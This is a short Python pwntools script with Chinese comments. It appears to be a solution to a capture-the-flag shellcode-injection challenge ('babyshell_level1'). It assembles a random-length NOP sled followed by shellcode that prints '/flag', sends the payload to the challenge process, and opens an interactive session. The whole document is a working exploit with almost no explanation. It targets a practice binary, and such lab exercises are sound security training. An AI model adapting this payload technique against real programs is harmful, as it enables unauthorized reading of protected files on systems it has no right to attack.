from pwn import *
import random

context(arch = 'amd64' , os = 'linux')

# 创建到挑战程序的进程
p = process("/challenge/babyshell_level1")

# 编写shellcode：读取"/flag"文件的内容
shellcode = shellcraft.cat("/flag")
shellcode = asm(shellcode)

# 生成随机长度的nop sled，长度在0x100到0x800字节之间
nop_sled_length = random.randint(0x100, 0x800)
nop_sled = asm('nop') * nop_sled_length

# 将nop sled和shellcode拼接
payload = nop_sled + shellcode

# 发送payload到挑战程序
p.send(payload)

# 与挑战程序交互
p.interactive()
